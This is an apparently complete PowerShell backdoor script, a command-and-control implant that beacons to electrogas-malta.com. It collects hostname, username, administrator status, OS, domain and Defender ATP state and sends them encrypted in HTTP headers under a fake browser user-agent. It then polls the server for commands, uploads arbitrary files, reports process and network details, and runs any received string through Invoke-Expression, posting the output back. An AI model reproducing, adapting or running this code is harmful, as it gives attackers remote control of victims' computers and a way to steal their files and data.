$b = (New-Object Net.WebClient).DownloadString('https://electrogas-malta.com:443/license.php');$OQZD = 5;
$YMWACC = "V0lMVElORVdLRFNXWklaQlFFQ1ZSRFBBSVZaS01ITFM=";
$MRD = "WUhXRU9FQU1HVEpVRlZGTA=="

function DHNHMKTMC($YMWACC, $MRD) {
    $LPL = New-Object "System.Security.Cryptography.AesManaged"
    $LPL.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $LPL.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
    $LPL.BlockSize = 128
    $LPL.KeySize = 256
    if ($MRD) {
        if ($MRD.getType().Name -eq "String") {
            $LPL.IV = [System.Convert]::FromBase64String($MRD)
        }
        else {
            $LPL.IV = $MRD
        }
    }
    if ($YMWACC) {
        if ($YMWACC.getType().Name -eq "String") {
            $LPL.Key = [System.Convert]::FromBase64String($YMWACC)
        }
        else {
            $LPL.Key = $YMWACC
        }
    }
    $LPL
}

function YGQ($YMWACC, $MRD, $unencryptedString) {
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString)
    $LPL = DHNHMKTMC $YMWACC $MRD
    $O = $LPL.CreateEncryptor()
    $encryptedData = $O.TransformFinalBlock($bytes, 0, $bytes.Length);
    [System.Convert]::ToBase64String($encryptedData)
}

function XMUY($YMWACC, $MRD, $cipher) {
    $bytes = [System.Convert]::FromBase64String($cipher)
    $LPL = DHNHMKTMC $YMWACC $MRD
    $decryptor = $LPL.CreateDecryptor();
    $CGZ = $decryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
    [System.Text.Encoding]::UTF8.GetString($CGZ).Trim([char]0)
}


$progressPreference = 'silentlyContinue';
$wc = New-Object system.Net.WebClient;
$wc2 = New-Object system.Net.WebClient;
$wcr = New-Object system.Net.WebClient;
$hostname = $env:COMPUTERNAME;
$OBWDTI = YGQ $YMWACC $MRD $hostname
$LJI = -join ((65..90) | Get-Random -Count 5 | % {[char]$_});
$r2 = $LJI;
$LRYXOH = "$hostname-$r2";
$BURJ = $env:USERNAME;
$whmenc = YGQ $YMWACC $MRD $BURJ
$SZXOBOED = (Get-WmiObject Win32_OperatingSystem).OSArchitecture
$LJTHYC = (Get-WmiObject -class Win32_OperatingSystem).Caption + "($SZXOBOED)";
$ZMD = (Get-WmiObject Win32_ComputerSystem).Domain;


$procarch = [Environment]::Is64BitProcess
$procarchf = ""
if ($procarch -eq "True"){$procarchf = "x64"}else{$procarchf="x86"}

$pn = Get-Process -PID $PID | % {$_.ProcessName}; $pnid = $pn + " ($pid) - $procarchf"

$user_identity = [Security.Principal.WindowsIdentity]::GetCurrent();
$iselv = (New-Object Security.Principal.WindowsPrincipal $user_identity).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)

if($iselv){
$BURJ = $BURJ + "*"
}

$random = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Advanced Threat Protection\Status" -Name OnboardingState -ErrorAction SilentlyContinue).OnboardingState;if($random -eq $null){$atp = $false}else{$atp = $true}
$raw_header = "$LRYXOH,$BURJ,$LJTHYC,$pnid,$ZMD,$atp";
$encrypted_header = YGQ $YMWACC $MRD $raw_header;
$final_hostname_encrypted = YGQ $YMWACC $MRD $LRYXOH

$wch = $wc.headers;
$wch.add("Authorization", $encrypted_header);
$wch.add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36");

$wc.downloadString("https://electrogas-malta.com:443/login");
$failure_counter = 0;
while($true){

    try{
    $command_raw = $wc2.downloadString("https://electrogas-malta.com:443/view/$LRYXOH");
    }catch{
    $failure_counter=$failure_counter +1;
    if ($failure_counter -eq 10){
    kill $pid
    }
    }

    #$final_command = XMUY $YMWACC $MRD $command_raw
    #$fc = $final_command.Trim([char]0).Trim([char]1).Trim([char]1).Trim([char]2).Trim([char]3).Trim([char]4).Trim([char]5).Trim([char]6).Trim([char]7).Trim([char]8).Trim([char]9).Trim([char]10).Trim([char]11).Trim([char]12).Trim([char]13).Trim([char]14).Trim([char]15).Trim([char]16).Trim([char]17).Trim([char]18).Trim([char]19).Trim([char]20).Trim([char]21)
    $fc = $command_raw;
    if(($fc -eq "") -Or ($fc -eq "False") ){

    } elseif($fc -eq "Report"){
      $ps = foreach ($i in Get-Process){$i.ProcessName};
      $local_ips = (Get-NetIPConfiguration | Where-Object { $_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected" }).IPv4Address.IPAddress;$arr = $local_ips.split("\n");
      $ps+= $arr -join ";"
      $ps+= (Get-WmiObject -Class win32_operatingSystem).version;
      $ps+= (Get-WinSystemLocale).Name
      $ps+= ((get-date) - (gcim Win32_OperatingSystem).LastBootUpTime).TotalHours
      $ps+= Get-Date -Format "HH:mm(MM/dd/yyyy)"
      $pst = YGQ $YMWACC $MRD $ps
      $wcrh = $wcr.Headers;
      $wcrh.add("Authorization", $pst);
      $wcrh.add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36");
      $wcrh.add("App-Logic", $OBWDTI);
      $wcr.downloadString("https://electrogas-malta.com:443/calls");
    } elseif($fc.split(" ")[0] -eq "Download"){
        $filename = YGQ $YMWACC $MRD $fc.split("\")[-1]
        $file_content = [System.IO.File]::ReadAllBytes($fc.split(" ")[1])
        $LBUISJQ = [Convert]::ToBase64String($file_content);
        $efc = YGQ $YMWACC $MRD $LBUISJQ;
        $UNP = new-object net.WebClient;
        $OLRCX = $UNP.Headers;
        $OLRCX.add("Content-Type", "application/x-www-form-urlencoded");
        $OLRCX.add("x-Authorization", $whmenc);
        $UNP.UploadString("https://electrogas-malta.com:443/messages", "fn=$filename&token=$efc");
    } elseif($fc -eq "reset-ps"){
        try{
        # Reset Powershell session (clean)
        # NOT IMPLEMENTED YET
        $ec = "NO";
        }
        catch{
        $ec = $Error[0] | Out-String;
        }

        $LBUISJQ = YGQ $YMWACC $MRD $ec;
        $UNP = New-Object system.Net.WebClient;
        $UNP.Headers["App-Logic"] = $final_hostname_encrypted;
        $UNP.Headers["Authorization"] = $LBUISJQ;
        $UNP.Headers["Session"] = $command_raw;
        $UNP.downloadString("https://electrogas-malta.com:443/bills");
    } else{
      try{
        #Write-Host "Executing command";
        #Write-Host $fc;
        #$ec = IEX($fc);
        $ec = Invoke-Expression ($fc) | Out-String;
        #Write-Host "Result:";
        #Write-Host $ec;
        }
        catch{
        $ec = $Error[0] | Out-String;
        }
        $ecbytes = [System.Text.Encoding]::UTF8.GetBytes($ec);
        $LBUISJQ = [System.Convert]::ToBase64String($ecbytes);
        $UrlLBUISJQ = $LBUISJQ.replace('=','%3D');

        $UNP = New-Object system.Net.WebClient;
        $UNP.Headers["App-Logic"] = $final_hostname_encrypted;
        $UNP.Headers["Authorization"] = "rGa4AGAMDSFAS34eaTfx";
        $UNP.Headers["Session"] = $command_raw;
        $UNP.UploadString("https://electrogas-malta.com:443/bills", "test=" + $UrlLBUISJQ);

        #$UNP.downloadString("https://electrogas-malta.com:443/bills");
    }

    sleep $OQZD;
    }
